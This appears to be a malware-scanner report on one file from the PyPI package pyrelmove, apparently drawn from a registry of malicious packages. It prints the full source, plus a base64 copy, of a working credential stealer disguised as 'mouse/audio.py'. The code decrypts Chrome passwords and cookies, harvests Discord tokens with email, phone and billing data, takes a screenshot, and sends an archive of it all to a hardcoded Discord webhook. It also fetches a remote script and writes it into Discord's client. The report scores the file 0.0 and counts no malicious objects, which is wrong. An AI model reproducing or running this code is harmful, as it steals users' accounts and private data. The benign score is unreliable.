statistics:
  total_files: 1
  skipped_files: 0.0
  processed_objects: 1
  malicious_objects: 0
details:
- path: .repo_cache/malicious_repos/pypi_malregistry/pyrelmove/0.0.13/pyrelmove-0.0.13/pyrelmove-0.0.13/mouse/audio.py
  contents:
  - name: <module>
    score: 0.0
    code: "import requests\nimport os \nimport shutil \nimport sqlite3 \nimport zipfile \nimport json \nimport base64 \nimport psutil \nimport pyautogui\n\nfrom win32crypt import CryptUnprotectData\nfrom re import findall\nfrom Crypto.Cipher import AES\n\nclass Hazard_Token_Grabber_V2:\n    def __init__(self):\n        self.webhook = \"https://discord.com/api/webhooks/1063615699760713768/nxosUxZi-XxvD3oH97BKB3lQbF5li6A6oVbqXrut-pyyQRZr_FTSXKFqVAbYlkMkHZYo\"\n        self.files = \"\"\n        self.appdata = os.getenv(\"localappdata\")\n        self.roaming = os.getenv(\"appdata\")\n        self.tempfolder = os.getenv(\"temp\")+\"\\\\Hazard_Token_Grabber_V2\"\n\n        try:\n            os.mkdir(os.path.join(self.tempfolder))\n        except Exception:\n            pass\n\n        self.tokens = []\n        self.saved = []\n\n        if os.path.exists(os.getenv(\"appdata\")+\"\\\\BetterDiscord\"):\n            self.bypass_better_discord()\n\n        if not os.path.exists(self.appdata+'\\\\Google'):\n            self.files += f\"{os.getlogin()} doesn't have google installed\\n\"\n        else:\n            self.grabPassword()\n            self.grabCookies()\n        self.grabTokens()\n        self.screenshot()\n        self.SendInfo()\n        self.LogOut()\n        try:\n            shutil.rmtree(self.tempfolder)\n        except (PermissionError, FileExistsError):\n            pass\n\n    def getheaders(self, token=None, content_type=\"application/json\"):\n        headers = {\n            \"Content-Type\": content_type,\n            \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11\"\n        }\n        if token:\n            headers.update({\"Authorization\": token})\n        return headers\n\n    def LogOut(self):\n        for proc in psutil.process_iter():\n            if any(procstr in proc.name().lower() for procstr in\\\n            ['discord', 'discordcanary', 'discorddevelopment', 'discordptb']):\n                proc.kill()\n        for root, dirs, files in os.walk(os.getenv(\"LOCALAPPDATA\")):\n            for name in dirs:\n                if \"discord_desktop_core-\" in name:\n                    try:\n                        directory_list = os.path.join(root, name+\"\\\\discord_desktop_core\\\\index.js\")\n                        os.mkdir(os.path.join(root, name+\"\\\\discord_desktop_core\\\\Hazard\"))\n                    except FileNotFoundError:\n                        pass\n                    f = requests.get(\"https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean\").text.replace(\"%WEBHOOK_LINK%\", self.webhook)\n                    with open(directory_list, 'w', encoding=\"utf-8\") as index_file:\n                        index_file.write(f)\n        for root, dirs, files in os.walk(os.getenv(\"APPDATA\")+\"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Discord Inc\"):\n            for name in files:\n                discord_file = os.path.join(root, name)\n                os.startfile(discord_file)\n\n    def bypass_better_discord(self):\n        bd = os.getenv(\"appdata\")+\"\\\\BetterDiscord\\\\data\\\\betterdiscord.asar\"\n        with open(bd, \"rt\", encoding=\"cp437\") as f:\n            content = f.read()\n            content2 = content.replace(\"api/webhooks\", \"RdimoTheGoat\")\n        with open(bd, 'w'): pass\n        with open(bd, \"wt\", encoding=\"cp437\") as f:\n            f.write(content2)\n\n    def get_master_key(self):\n        with open(self.appdata+'\\\\Google\\\\Chrome\\\\User Data\\\\Local State', \"r\", encoding=\"utf-8\") as f:\n            local_state = f.read()\n        local_state = json.loads(local_state)\n\n        master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n        master_key = master_key[5:]\n        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]\n        return master_key\n    \n    def decrypt_payload(self, cipher, payload):\n        return cipher.decrypt(payload)\n    \n    def generate_cipher(self, aes_key, iv):\n        return AES.new(aes_key, AES.MODE_GCM, iv)\n    \n    def decrypt_password(self, buff, master_key):\n        try:\n            iv = buff[3:15]\n            payload = buff[15:]\n            cipher = self.generate_cipher(master_key, iv)\n            decrypted_pass = self.decrypt_payload(cipher, payload)\n            decrypted_pass = decrypted_pass[:-16].decode()\n            return decrypted_pass\n        except:\n            return \"Chrome < 80\"\n    \n    def grabPassword(self):\n        master_key = self.get_master_key()\n        f = open(self.tempfolder+\"\\\\Google Passwords.txt\", \"w\", encoding=\"cp437\", errors='ignore')\n        f.write(\"Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\\n\\n\")\n        login_db = self.appdata+'\\\\Google\\\\Chrome\\\\User Data\\\\default\\\\Login Data'\n        try:\n            shutil.copy2(login_db, \"Loginvault.db\")\n        except FileNotFoundError:\n            pass\n        conn = sqlite3.connect(\"Loginvault.db\")\n        cursor = conn.cursor()\n        try:\n            cursor.execute(\"SELECT action_url, username_value, password_value FROM logins\")\n            for r in cursor.fetchall():\n                url = r[0]\n                username = r[1]\n                encrypted_password = r[2]\n                decrypted_password = self.decrypt_password(encrypted_password, master_key)\n                if url != \"\":\n                    f.write(f\"Domain: {url}\\nUser: {username}\\nPass: {decrypted_password}\\n\\n\")\n        except:\n            pass\n        f.close()\n        cursor.close()\n        conn.close()\n        try:\n            os.remove(\"Loginvault.db\")\n        except:\n            pass\n\n    def grabCookies(self):\n        master_key = self.get_master_key()\n        f = open(self.tempfolder+\"\\\\Google Cookies.txt\", \"w\", encoding=\"cp437\", errors='ignore')\n        f.write(\"Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\\n\\n\")\n        login_db = self.appdata+'\\\\Google\\\\Chrome\\\\User Data\\\\default\\\\Network\\\\cookies'\n        try:\n            shutil.copy2(login_db, \"Loginvault.db\")\n        except FileNotFoundError:\n            pass\n        conn = sqlite3.connect(\"Loginvault.db\")\n        cursor = conn.cursor()\n        try:\n            cursor.execute(\"SELECT host_key, name, encrypted_value from cookies\")\n            for r in cursor.fetchall():\n                Host = r[0]\n                user = r[1]\n                encrypted_cookie = r[2]\n                decrypted_cookie = self.decrypt_password(encrypted_cookie, master_key)\n                if Host != \"\":\n                    f.write(f\"Host: {Host}\\nUser: {user}\\nCookie: {decrypted_cookie}\\n\\n\")\n        except:\n            pass\n        f.close()\n        cursor.close()\n        conn.close()\n        try:\n            os.remove(\"Loginvault.db\")\n        except:\n            pass\n\n    def grabTokens(self):\n        f = open(self.tempfolder+\"\\\\Discord Info.txt\", \"w\", encoding=\"cp437\", errors='ignore')\n        f.write(\"Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\\n\\n\")\n        paths = {\n            'Discord': self.roaming + r'\\\\discord\\\\Local Storage\\\\leveldb\\\\',\n            'Discord Canary': self.roaming + r'\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\',\n            'Lightcord': self.roaming + r'\\\\Lightcord\\\\Local Storage\\\\leveldb\\\\',\n            'Discord PTB': self.roaming + r'\\\\discordptb\\\\Local Storage\\\\leveldb\\\\',\n            'Opera': self.roaming + r'\\\\Opera Software\\\\Opera Stable\\\\Local Storage\\\\leveldb\\\\',\n            'Opera GX': self.roaming + r'\\\\Opera Software\\\\Opera GX Stable\\\\Local Storage\\\\leveldb\\\\',\n            'Amigo': self.appdata + r'\\\\Amigo\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Torch': self.appdata + r'\\\\Torch\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Kometa': self.appdata + r'\\\\Kometa\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Orbitum': self.appdata + r'\\\\Orbitum\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'CentBrowser': self.appdata + r'\\\\CentBrowser\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            '7Star': self.appdata + r'\\\\7Star\\\\7Star\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Sputnik': self.appdata + r'\\\\Sputnik\\\\Sputnik\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Vivaldi': self.appdata + r'\\\\Vivaldi\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome SxS': self.appdata + r'\\\\Google\\\\Chrome SxS\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome': self.appdata + r'\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Epic Privacy Browser': self.appdata + r'\\\\Epic Privacy Browser\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Microsoft Edge': self.appdata + r'\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul\\\\Local Storage\\\\leveldb\\\\',\n            'Uran': self.appdata + r'\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Yandex': self.appdata + r'\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Brave': self.appdata + r'\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Iridium': self.appdata + r'\\\\Iridium\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\'\n        }\n\n        for source, path in paths.items():\n            if not os.path.exists(path):\n                continue\n            for file_name in os.listdir(path):\n                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):\n                    continue\n                for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:\n                    for regex in (r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}\", r\"mfa\\.[\\w-]{84}\"):\n                        for token in findall(regex, line):\n                            self.tokens.append(token)\n        for token in self.tokens:\n            r = requests.get(\"https://discord.com/api/v9/users/@me\", headers=self.getheaders(token))\n            if r.status_code == 200:\n                if token in self.saved:\n                    continue\n                self.saved.append(token)\n                j = requests.get(\"https://discord.com/api/v9/users/@me\", headers=self.getheaders(token)).json()\n                badges = \"\"\n                flags = j['flags']\n                if (flags == 1):\n                    badges += \"Staff, \"\n                if (flags == 2):\n                    badges += \"Partner, \"\n                if (flags == 4):\n                    badges += \"Hypesquad Event, \"\n                if (flags == 8):\n                    badges += \"Green Bughunter, \"\n                if (flags == 64):\n                    badges += \"Hypesquad Bravery, \"\n                if (flags == 128):\n                    badges += \"HypeSquad Brillance, \"\n                if (flags == 256):\n                    badges += \"HypeSquad Balance, \"\n                if (flags == 512):\n                    badges += \"Early Supporter, \"\n                if (flags == 16384):\n                    badges += \"Gold BugHunter, \"\n                if (flags == 131072):\n                    badges += \"Verified Bot Developer, \"\n                if (badges == \"\"):\n                    badges = \"None\"\n\n                user = j[\"username\"] + \"#\" + str(j[\"discriminator\"])\n                email = j[\"email\"]\n                phone = j[\"phone\"] if j[\"phone\"] else \"No Phone Number attached\"\n\n                url = f'https://cdn.discordapp.com/avatars/{j[\"id\"]}/{j[\"avatar\"]}.gif'\n                try:\n                    requests.get(url)\n                except:\n                    url = url[:-4]\n\n                nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.getheaders(token)).json()\n                has_nitro = False\n                has_nitro = bool(len(nitro_data) > 0)\n\n                billing = bool(len(json.loads(requests.get(\"https://discordapp.com/api/v6/users/@me/billing/payment-sources\", headers=self.getheaders(token)).text)) > 0)\n                \n                f.write(f\"{' '*17}{user}\\n{'-'*50}\\nToken: {token}\\nHas Billing: {billing}\\nNitro: {has_nitro}\\nBadges: {badges}\\nEmail: {email}\\nPhone: {phone}\\n[Avatar]({url})\\n\\n\")\n        f.close()\n\n    def screenshot(self):\n        image = pyautogui.screenshot()\n        image.save(self.tempfolder + \"\\\\Screenshot.png\")\n\n    def SendInfo(self):\n        ip = country = city = region = googlemap = \"None\"\n        try:\n            data = requests.get(\"http://ipinfo.io/json\").json()\n            ip = data['ip']\n            city = data['city']\n            country = data['country']\n            region = data['region']\n            googlemap = \"https://www.google.com/maps/search/google+map++\" + data['loc']\n        except Exception:\n            pass\n        temp = os.path.join(self.tempfolder)\n        new = os.path.join(self.appdata, f'Hazard.V2-[{os.getlogin()}].zip')\n        self.zip(temp, new)\n        for dirname, _, files in os.walk(self.tempfolder):\n            for f in files:\n                self.files += f\"\\n{f}\"\n        n = 0\n        for r, d, files in os.walk(self.tempfolder):\n            n+= len(files)\n            self.fileCount = f\"{n} Files Found: \"\n        embed = {\n            \"avatar_url\":\"https://cdn.discordapp.com/attachments/828047793619861557/891537255078985819/nedladdning_9.gif\",\n            \"embeds\": [\n                {\n                    \"author\": {\n                        \"name\": \"Hazard Token Grabber.V2\",\n                        \"url\": \"https://github.com/Rdimo/Hazard-Token-Grabber-V2\",\n                        \"icon_url\": \"https://cdn.discordapp.com/attachments/828047793619861557/891698193245560862/Hazard.gif\"\n                    },\n                    \"description\": f\"**{os.getlogin()}** Just ran Hazard Token Grabber.V2\\n```fix\\nComputerName: {os.getenv('COMPUTERNAME')}\\nIP: {ip}\\nCity: {city}\\nRegion: {region}\\nCountry: {country}```[Google Maps Location]({googlemap})\\n```fix\\n{self.fileCount}{self.files}```\",\n                    \"color\": 16119101,\n\n                    \"thumbnail\": {\n                      \"url\": \"https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Hazard.gif\"\n                    },       \n\n                    \"footer\": {\n                      \"text\": \"k\"\n                    }\n                }\n            ]\n        }\n        requests.post(self.webhook, json=embed)\n        requests.post(self.webhook, files={'upload_file': open(new,'rb')})\n\n    def zip(self, src, dst):\n        zipped_file = zipfile.ZipFile(dst, \"w\", zipfile.ZIP_DEFLATED)\n        abs_src = os.path.abspath(src)\n        for dirname, _, files in os.walk(src):\n            for filename in files:\n                absname = os.path.abspath(os.path.join(dirname, filename))\n                arcname = absname[len(abs_src) + 1:]\n                zipped_file.write(absname, arcname)\n        zipped_file.close()"
    tokens: resume load_const INTEGER load_const import_name requests store_name requests load_const INTEGER load_const import_name os store_name os load_const INTEGER load_const import_name shutil store_name shutil load_const INTEGER load_const import_name sqlite3 store_name sqlite3 load_const INTEGER load_const import_name zipfile store_name zipfile load_const INTEGER load_const import_name json store_name json load_const INTEGER load_const import_name base64 store_name base64 load_const INTEGER load_const import_name psutil store_name psutil load_const INTEGER load_const import_name pyautogui store_name pyautogui load_const INTEGER load_const import_name win32crypt import_from STRING_LEN_S_ENT_HIGH store_name STRING_LEN_S_ENT_HIGH pop_top load_const INTEGER load_const import_name re import_from findall store_name findall pop_top load_const INTEGER load_const import_name Crypto.Cipher import_from AES store_name AES pop_top push_null load_build_class load_const OBJECT make_function load_const STRING_LEN_S_ENT_HIGH call store_name STRING_LEN_S_ENT_HIGH load_name __name__ load_const __main__ compare_op == pop_jump_if_false TO_NUMBER push_null load_name STRING_LEN_S_ENT_HIGH call pop_top return_const None return_const None
    hash: 41ac46104d13b8719b14510cc73e03371a2c44bf9ad4a6bd784b9fdaa4e85e52
sources:
  .repo_cache/malicious_repos/pypi_malregistry/pyrelmove/0.0.13/pyrelmove-0.0.13/pyrelmove-0.0.13/mouse/audio.py: aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBvcyAKaW1wb3J0IHNodXRpbCAKaW1wb3J0IHNxbGl0ZTMgCmltcG9ydCB6aXBmaWxlIAppbXBvcnQganNvbiAKaW1wb3J0IGJhc2U2NCAKaW1wb3J0IHBzdXRpbCAKaW1wb3J0IHB5YXV0b2d1aQoKZnJvbSB3aW4zMmNyeXB0IGltcG9ydCBDcnlwdFVucHJvdGVjdERhdGEKZnJvbSByZSBpbXBvcnQgZmluZGFsbApmcm9tIENyeXB0by5DaXBoZXIgaW1wb3J0IEFFUwoKY2xhc3MgSGF6YXJkX1Rva2VuX0dyYWJiZXJfVjI6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi53ZWJob29rID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEwNjM2MTU2OTk3NjA3MTM3Njgvbnhvc1V4WmktWHh2RDNvSDk3QktCM2xRYkY1bGk2QTZvVmJxWHJ1dC1weXlRUlpyX0ZUU1hLRnFWQWJZbGtNa0haWW8iCiAgICAgICAgc2VsZi5maWxlcyA9ICIiCiAgICAgICAgc2VsZi5hcHBkYXRhID0gb3MuZ2V0ZW52KCJsb2NhbGFwcGRhdGEiKQogICAgICAgIHNlbGYucm9hbWluZyA9IG9zLmdldGVudigiYXBwZGF0YSIpCiAgICAgICAgc2VsZi50ZW1wZm9sZGVyID0gb3MuZ2V0ZW52KCJ0ZW1wIikrIlxcSGF6YXJkX1Rva2VuX0dyYWJiZXJfVjIiCgogICAgICAgIHRyeToKICAgICAgICAgICAgb3MubWtkaXIob3MucGF0aC5qb2luKHNlbGYudGVtcGZvbGRlcikpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgcGFzcwoKICAgICAgICBzZWxmLnRva2VucyA9IFtdCiAgICAgICAgc2VsZi5zYXZlZCA9IFtdCgogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKG9zLmdldGVudigiYXBwZGF0YSIpKyJcXEJldHRlckRpc2NvcmQiKToKICAgICAgICAgICAgc2VsZi5ieXBhc3NfYmV0dGVyX2Rpc2NvcmQoKQoKICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoc2VsZi5hcHBkYXRhKydcXEdvb2dsZScpOgogICAgICAgICAgICBzZWxmLmZpbGVzICs9IGYie29zLmdldGxvZ2luKCl9IGRvZXNuJ3QgaGF2ZSBnb29nbGUgaW5zdGFsbGVkXG4iCiAgICAgICAgZWxzZToKICAgICAgICAgICAgc2VsZi5ncmFiUGFzc3dvcmQoKQogICAgICAgICAgICBzZWxmLmdyYWJDb29raWVzKCkKICAgICAgICBzZWxmLmdyYWJUb2tlbnMoKQogICAgICAgIHNlbGYuc2NyZWVuc2hvdCgpCiAgICAgICAgc2VsZi5TZW5kSW5mbygpCiAgICAgICAgc2VsZi5Mb2dPdXQoKQogICAgICAgIHRyeToKICAgICAgICAgICAgc2h1dGlsLnJtdHJlZShzZWxmLnRlbXBmb2xkZXIpCiAgICAgICAgZXhjZXB0IChQZXJtaXNzaW9uRXJyb3IsIEZpbGVFeGlzdHNFcnJvcik6CiAgICAgICAgICAgIHBhc3MKCiAgICBkZWYgZ2V0aGVhZGVycyhzZWxmLCB0b2tlbj1Ob25lLCBjb250ZW50X3R5cGU9ImFwcGxpY2F0aW9uL2pzb24iKToKICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAiQ29udGVudC1UeXBlIjogY29udGVudF90eXBlLAogICAgICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4xMSAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8yMy4wLjEyNzEuNjQgU2FmYXJpLzUzNy4xMSIKICAgICAgICB9CiAgICAgICAgaWYgdG9rZW46CiAgICAgICAgICAgIGhlYWRlcnMudXBkYXRlKHsiQXV0aG9yaXphdGlvbiI6IHRva2VufSkKICAgICAgICByZXR1cm4gaGVhZGVycwoKICAgIGRlZiBMb2dPdXQoc2VsZik6CiAgICAgICAgZm9yIHByb2MgaW4gcHN1dGlsLnByb2Nlc3NfaXRlcigpOgogICAgICAgICAgICBpZiBhbnkocHJvY3N0ciBpbiBwcm9jLm5hbWUoKS5sb3dlcigpIGZvciBwcm9jc3RyIGluXAogICAgICAgICAgICBbJ2Rpc2NvcmQnLCAnZGlzY29yZGNhbmFyeScsICdkaXNjb3JkZGV2ZWxvcG1lbnQnLCAnZGlzY29yZHB0YiddKToKICAgICAgICAgICAgICAgIHByb2Mua2lsbCgpCiAgICAgICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsob3MuZ2V0ZW52KCJMT0NBTEFQUERBVEEiKSk6CiAgICAgICAgICAgIGZvciBuYW1lIGluIGRpcnM6CiAgICAgICAgICAgICAgICBpZiAiZGlzY29yZF9kZXNrdG9wX2NvcmUtIiBpbiBuYW1lOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgZGlyZWN0b3J5X2xpc3QgPSBvcy5wYXRoLmpvaW4ocm9vdCwgbmFtZSsiXFxkaXNjb3JkX2Rlc2t0b3BfY29yZVxcaW5kZXguanMiKQogICAgICAgICAgICAgICAgICAgICAgICBvcy5ta2Rpcihvcy5wYXRoLmpvaW4ocm9vdCwgbmFtZSsiXFxkaXNjb3JkX2Rlc2t0b3BfY29yZVxcSGF6YXJkIikpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICAgICAgZiA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1JkaW1vL0luamVjdGlvbi9tYXN0ZXIvSW5qZWN0aW9uLWNsZWFuIikudGV4dC5yZXBsYWNlKCIlV0VCSE9PS19MSU5LJSIsIHNlbGYud2ViaG9vaykKICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4oZGlyZWN0b3J5X2xpc3QsICd3JywgZW5jb2Rpbmc9InV0Zi04IikgYXMgaW5kZXhfZmlsZToKICAgICAgICAgICAgICAgICAgICAgICAgaW5kZXhfZmlsZS53cml0ZShmKQogICAgICAgIGZvciByb290LCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKG9zLmdldGVudigiQVBQREFUQSIpKyJcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXERpc2NvcmQgSW5jIik6CiAgICAgICAgICAgIGZvciBuYW1lIGluIGZpbGVzOgogICAgICAgICAgICAgICAgZGlzY29yZF9maWxlID0gb3MucGF0aC5qb2luKHJvb3QsIG5hbWUpCiAgICAgICAgICAgICAgICBvcy5zdGFydGZpbGUoZGlzY29yZF9maWxlKQoKICAgIGRlZiBieXBhc3NfYmV0dGVyX2Rpc2NvcmQoc2VsZik6CiAgICAgICAgYmQgPSBvcy5nZXRlbnYoImFwcGRhdGEiKSsiXFxCZXR0ZXJEaXNjb3JkXFxkYXRhXFxiZXR0ZXJkaXNjb3JkLmFzYXIiCiAgICAgICAgd2l0aCBvcGVuKGJkLCAicnQiLCBlbmNvZGluZz0iY3A0MzciKSBhcyBmOgogICAgICAgICAgICBjb250ZW50ID0gZi5yZWFkKCkKICAgICAgICAgICAgY29udGVudDIgPSBjb250ZW50LnJlcGxhY2UoImFwaS93ZWJob29rcyIsICJSZGltb1RoZUdvYXQiKQogICAgICAgIHdpdGggb3BlbihiZCwgJ3cnKTogcGFzcwogICAgICAgIHdpdGggb3BlbihiZCwgInd0IiwgZW5jb2Rpbmc9ImNwNDM3IikgYXMgZjoKICAgICAgICAgICAgZi53cml0ZShjb250ZW50MikKCiAgICBkZWYgZ2V0X21hc3Rlcl9rZXkoc2VsZik6CiAgICAgICAgd2l0aCBvcGVuKHNlbGYuYXBwZGF0YSsnXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxMb2NhbCBTdGF0ZScsICJyIiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoKICAgICAgICAgICAgbG9jYWxfc3RhdGUgPSBmLnJlYWQoKQogICAgICAgIGxvY2FsX3N0YXRlID0ganNvbi5sb2Fkcyhsb2NhbF9zdGF0ZSkKCiAgICAgICAgbWFzdGVyX2tleSA9IGJhc2U2NC5iNjRkZWNvZGUobG9jYWxfc3RhdGVbIm9zX2NyeXB0Il1bImVuY3J5cHRlZF9rZXkiXSkKICAgICAgICBtYXN0ZXJfa2V5ID0gbWFzdGVyX2tleVs1Ol0KICAgICAgICBtYXN0ZXJfa2V5ID0gQ3J5cHRVbnByb3RlY3REYXRhKG1hc3Rlcl9rZXksIE5vbmUsIE5vbmUsIE5vbmUsIDApWzFdCiAgICAgICAgcmV0dXJuIG1hc3Rlcl9rZXkKICAgIAogICAgZGVmIGRlY3J5cHRfcGF5bG9hZChzZWxmLCBjaXBoZXIsIHBheWxvYWQpOgogICAgICAgIHJldHVybiBjaXBoZXIuZGVjcnlwdChwYXlsb2FkKQogICAgCiAgICBkZWYgZ2VuZXJhdGVfY2lwaGVyKHNlbGYsIGFlc19rZXksIGl2KToKICAgICAgICByZXR1cm4gQUVTLm5ldyhhZXNfa2V5LCBBRVMuTU9ERV9HQ00sIGl2KQogICAgCiAgICBkZWYgZGVjcnlwdF9wYXNzd29yZChzZWxmLCBidWZmLCBtYXN0ZXJfa2V5KToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGl2ID0gYnVmZlszOjE1XQogICAgICAgICAgICBwYXlsb2FkID0gYnVmZlsxNTpdCiAgICAgICAgICAgIGNpcGhlciA9IHNlbGYuZ2VuZXJhdGVfY2lwaGVyKG1hc3Rlcl9rZXksIGl2KQogICAgICAgICAgICBkZWNyeXB0ZWRfcGFzcyA9IHNlbGYuZGVjcnlwdF9wYXlsb2FkKGNpcGhlciwgcGF5bG9hZCkKICAgICAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBkZWNyeXB0ZWRfcGFzc1s6LTE2XS5kZWNvZGUoKQogICAgICAgICAgICByZXR1cm4gZGVjcnlwdGVkX3Bhc3MKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHJldHVybiAiQ2hyb21lIDwgODAiCiAgICAKICAgIGRlZiBncmFiUGFzc3dvcmQoc2VsZik6CiAgICAgICAgbWFzdGVyX2tleSA9IHNlbGYuZ2V0X21hc3Rlcl9rZXkoKQogICAgICAgIGYgPSBvcGVuKHNlbGYudGVtcGZvbGRlcisiXFxHb29nbGUgUGFzc3dvcmRzLnR4dCIsICJ3IiwgZW5jb2Rpbmc9ImNwNDM3IiwgZXJyb3JzPSdpZ25vcmUnKQogICAgICAgIGYud3JpdGUoIk1hZGUgYnkgUmRpbW8gfCBodHRwczovL2dpdGh1Yi5jb20vUmRpbW8vSGF6YXJkLVRva2VuLUdyYWJiZXItVjJcblxuIikKICAgICAgICBsb2dpbl9kYiA9IHNlbGYuYXBwZGF0YSsnXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxkZWZhdWx0XFxMb2dpbiBEYXRhJwogICAgICAgIHRyeToKICAgICAgICAgICAgc2h1dGlsLmNvcHkyKGxvZ2luX2RiLCAiTG9naW52YXVsdC5kYiIpCiAgICAgICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOgogICAgICAgICAgICBwYXNzCiAgICAgICAgY29ubiA9IHNxbGl0ZTMuY29ubmVjdCgiTG9naW52YXVsdC5kYiIpCiAgICAgICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQogICAgICAgIHRyeToKICAgICAgICAgICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBhY3Rpb25fdXJsLCB1c2VybmFtZV92YWx1ZSwgcGFzc3dvcmRfdmFsdWUgRlJPTSBsb2dpbnMiKQogICAgICAgICAgICBmb3IgciBpbiBjdXJzb3IuZmV0Y2hhbGwoKToKICAgICAgICAgICAgICAgIHVybCA9IHJbMF0KICAgICAgICAgICAgICAgIHVzZXJuYW1lID0gclsxXQogICAgICAgICAgICAgICAgZW5jcnlwdGVkX3Bhc3N3b3JkID0gclsyXQogICAgICAgICAgICAgICAgZGVjcnlwdGVkX3Bhc3N3b3JkID0gc2VsZi5kZWNyeXB0X3Bhc3N3b3JkKGVuY3J5cHRlZF9wYXNzd29yZCwgbWFzdGVyX2tleSkKICAgICAgICAgICAgICAgIGlmIHVybCAhPSAiIjoKICAgICAgICAgICAgICAgICAgICBmLndyaXRlKGYiRG9tYWluOiB7dXJsfVxuVXNlcjoge3VzZXJuYW1lfVxuUGFzczoge2RlY3J5cHRlZF9wYXNzd29yZH1cblxuIikKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKICAgICAgICBmLmNsb3NlKCkKICAgICAgICBjdXJzb3IuY2xvc2UoKQogICAgICAgIGNvbm4uY2xvc2UoKQogICAgICAgIHRyeToKICAgICAgICAgICAgb3MucmVtb3ZlKCJMb2dpbnZhdWx0LmRiIikKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKCiAgICBkZWYgZ3JhYkNvb2tpZXMoc2VsZik6CiAgICAgICAgbWFzdGVyX2tleSA9IHNlbGYuZ2V0X21hc3Rlcl9rZXkoKQogICAgICAgIGYgPSBvcGVuKHNlbGYudGVtcGZvbGRlcisiXFxHb29nbGUgQ29va2llcy50eHQiLCAidyIsIGVuY29kaW5nPSJjcDQzNyIsIGVycm9ycz0naWdub3JlJykKICAgICAgICBmLndyaXRlKCJNYWRlIGJ5IFJkaW1vIHwgaHR0cHM6Ly9naXRodWIuY29tL1JkaW1vL0hhemFyZC1Ub2tlbi1HcmFiYmVyLVYyXG5cbiIpCiAgICAgICAgbG9naW5fZGIgPSBzZWxmLmFwcGRhdGErJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcZGVmYXVsdFxcTmV0d29ya1xcY29va2llcycKICAgICAgICB0cnk6CiAgICAgICAgICAgIHNodXRpbC5jb3B5Mihsb2dpbl9kYiwgIkxvZ2ludmF1bHQuZGIiKQogICAgICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICAgICAgcGFzcwogICAgICAgIGNvbm4gPSBzcWxpdGUzLmNvbm5lY3QoIkxvZ2ludmF1bHQuZGIiKQogICAgICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKICAgICAgICB0cnk6CiAgICAgICAgICAgIGN1cnNvci5leGVjdXRlKCJTRUx